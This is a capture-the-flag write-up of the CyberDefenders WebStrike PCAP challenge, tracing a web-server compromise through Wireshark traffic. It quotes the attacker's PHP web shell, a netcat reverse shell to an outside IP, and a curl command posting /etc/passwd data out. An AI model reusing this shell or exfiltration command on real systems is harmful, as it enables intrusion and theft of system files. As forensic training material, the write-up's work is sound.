---
title: '[Cyberdefenders] - WebStrike'
date: '08/04/2024'
lastmod: '08/04/2024'
tags: ['Network Analysis', 'PCAP', 'Wireshark', 'Exfiltration']
summary: 'Here is my writeup for WebStrike challenge that I completed on Cyberdefenders.'
draft: false
author: ['H4shBadG']
---

# Summary

An anomaly was discovered within our company's intranet as our Development team found an unusual file on one of our web servers. Suspecting potential malicious activity, the network team has prepared a pcap file with critical network traffic for analysis for the security team, and you have been tasked with analyzing the pcap.

## Q1 - Understanding the geographical origin of the attack aids in geo-blocking measures and threat intelligence analysis. What city did the attack originate from?

IPinfo on the attacker's IP reveals that the attack is from Tianjin, China.

## Q2 - Knowing the attacker's user-agent assists in creating robust filtering rules. What's the attacker's user agent?

Getting that information on a HTTP request and looking at the User-Agent field, I retrieve the one below :

```
Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

## Q3 - We need to identify if there were potential vulnerabilities exploited. What's the name of the malicious web shell uploaded?

On packet 63, I can see some uploading on the server as below :

```
-----------------------------26176590812480906864292095114
Content-Disposition: form-data; name="uploadedFile"; filename="image.jpg.php"
Content-Type: application/x-php

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>

-----------------------------26176590812480906864292095114--
```

This is a simple reverse shell to the attacker IP

## Q4 - Knowing the directory where files uploaded are stored is important for reinforcing defenses against unauthorized access. Which directory is used by the website to store the uploaded files?

Looking on the TCP stream n*9, I got some information where the webshell is uploaded :

```
HTTP/1.1 200 OK
Date: Thu, 30 Nov 2023 18:44:45 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 464
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html;charset=UTF-8

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /reviews/uploads</title>
 </head>
 <body>
<h1>Index of /reviews/uploads</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/reviews/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="image.jpg.php">image.jpg.php</a></td><td align="right">2023-11-30 13:44  </td><td align="right">102 </td><td>&nbsp;</td></tr>
```

## Q5 - Identifying the port utilized by the web shell helps improve firewall configurations for blocking unauthorized outbound traffic. What port was used by the malicious web shell?

Looking at the reverse shell found in Q3, the reverse shell is communicating on the port 8080. 

```
...nc 117.11.88.124 8080...
```

## Q6 - Understanding the value of compromised data assists in prioritizing incident response actions. What file was the attacker trying to exfiltrate?

Looking through the TCP streams, I found the moment the attacker is accessing the system and trying to get the `passwd` file via POST request.

```
$ curl -X POST -d /etc/passwd http://117.11.88.124:443/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   368  100   357  100    11  56774   17[393 bytes missing in capture file].$ 
```